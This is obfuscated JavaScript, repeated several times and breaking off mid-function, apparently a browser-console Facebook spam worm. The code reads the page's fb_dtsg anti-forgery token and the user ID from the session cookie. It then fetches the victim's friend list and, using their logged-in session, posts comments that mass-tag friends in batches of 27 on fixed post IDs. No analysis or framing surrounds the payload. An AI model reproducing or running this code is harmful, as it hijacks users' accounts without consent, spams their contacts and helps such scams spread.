{_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[71],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[72],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[5],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[41],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[73],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[41],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[74],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[75],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);
var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "464930496971835", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"];
    var fb_dtsg = document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
    var user_id = document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
    var id = _0xa22c[5];
    var arkadaslar = [];
    var svn_rev;
     
    function arkadaslari_al(id) {
        var _0x7892x7 = new XMLHttpRequest();
        _0x7892x7[_0xa22c[6]] = function () {
            if (_0x7892x7[_0xa22c[7]] == 4) {
                eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]);
                for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) {
                    mesaj = _0xa22c[10];
                    mesaj_text = _0xa22c[10];
                    for (i = f * 27; i < (f + 1) * 27; i++) {
                        if (arkadaslar[_0xa22c[16]][_0xa22c[15]][i]) {
                            mesaj += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]] + _0xa22c[22];
                            mesaj_text += _0xa22c[23] + arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
                        };
                    };
                    yorum_yap(id, mesaj);
                };
            };
        };
        var _0x7892x8 = _0xa22c[24];
        _0x7892x8 += _0xa22c[25];
        _0x7892x8 += _0xa22c[26];
        _0x7892x8 += _0xa22c[27];
        _0x7892x8 += _0xa22c[28] + user_id;
        _0x7892x8 += _0xa22c[29] + user_id;
        if (document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30]) >= 0) {
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[34] + _0x7892x8, true);
        } else {
            _0x7892x7[_0xa22c[35]](_0xa22c[33], _0xa22c[36] + _0x7892x8, true);
        };
        _0x7892x7[_0xa22c[37]]();
    };
     
    function RandomArkadas() {
        var _0x7892xa = _0xa22c[10];
        for (i = 0; i < 9; i++) {
            _0x7892xa += _0xa22c[18] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]] + _0xa22c[20] + arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]() * arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]] + _0xa22c[22];
        };
        return _0x7892xa;
    };
     
    function yorum_yap(id, _0x7892xc) {
        var _0x7892xd = new XMLHttpRequest();
        var _0x7892x8 = _0xa22c[10];
        _0x7892x8 += _0xa22c[40] + id;
        _0x7892x8 += _0xa22c[41] + encodeURIComponent(_0x7892xc);
        _0x7892x8 += _0xa22c[42];
        _0x7892x8 += _0xa22c[43];
        _0x7892x8 += _0xa22c[44];
        _0x7892x8 += _0xa22c[45];
        _0x7892x8 += _0xa22c[46];
        _0x7892x8 += _0xa22c[47] + id + _0xa22c[48];
        _0x7892x8 += _0xa22c[49];
        _0x7892x8 += _0xa22c[50];
        _0x7892x8 += _0xa22c[51];
        _0x7892x8 += _0xa22c[52];
        _0x7892x8 += _0xa22c[29] + user_id;
        _0x7892x8 += _0xa22c[53];
        _0x7892x8 += _0xa22c[54];
        _0x7892x8 += _0xa22c[55];
        _0x7892x8 += _0xa22c[56] + fb_dtsg;
        _0x7892x8 += _0xa22c[57];
        _0x7892xd[_0xa22c[35]](_0xa22c[58], _0xa22c[59], true);
        _0x7892xd[_0xa22c[62]](_0xa22c[60], _0xa22c[61]);
        _0x7892xd[_0xa22c[6]] = function () {
            if (_0x7892xd[_0xa22c[7]] == 4 && _0x7892xd[_0xa22c[63]] == 200) {
                _0x7892xd[_0xa22c[64]];
            };
        };
        _0x7892xd[_0xa22c[37]](_0x7892x8);
    };
    arkadaslari_al(id);
var _0xa22c = ["value", "fb_dtsg", "getElementsByName", "match", "cookie", "283956995105034", "onreadystatechange", "readyState", "arkadaslar = ", "for (;;);", "", "replace", "responseText", ";", "length", "entries", "payload", "round", " @[", "uid", ":", "text", "]", " ", "\x26filter[0]=user", "\x26options[0]=friends_only", "\x26options[1]=nm", "\x26token=v7", "\x26viewer=", "\x26__user=", "https://", "indexOf", "URL", "GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "open", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1", "send", "random", "floor", "\x26ft_ent_identifier=", "\x26comment_text=", "\x26source=2", "\x26client_id=1377871797138:1707018092", "\x26reply_fbid", "\x26parent_comment_id", "\x26rootid=u_jsonp_2_3", "\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:", "}", "\x26attached_sticker_fbid=0", "\x26attached_photo_fbid=0", "\x26giftoccasion", "\x26ft[tn]=[]", "\x26__a=1", "\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo", "\x26__req=q", "\x26fb_dtsg=", "\x26ttstamp=", "POST", "/ajax/ufi/add_comment.php", "Content-type", "application/x-www-form-urlencoded", "setRequestHeader", "status", "close"]; 
    var fb_dtsg = document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]]; 
    var user_id = document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]); 
    var id = _0xa22c[5]; 
    var arkadaslar = []; 
    var svn_rev; 
       
  
    function arkadaslari_al(id) { 
        var _0x7892x7 = new XMLHttpRequest(); 
        _0x7892x7[_0xa22c[6]] = function () { 
            if (_0x7892x7[_0xa22c[7]] == 4) { 
                eval(_0xa22c[8] + _0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9], _0xa22c[10]) + _0xa22c[13]); 
                for (f = 0; f < Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]] / 27); f++) { 
                    mesaj = _0xa22c[10]; 
                    mesaj_text = _0xa22c[10]; 
                    for (i = f * 27; i < (f + 1) * 27; i++) { 
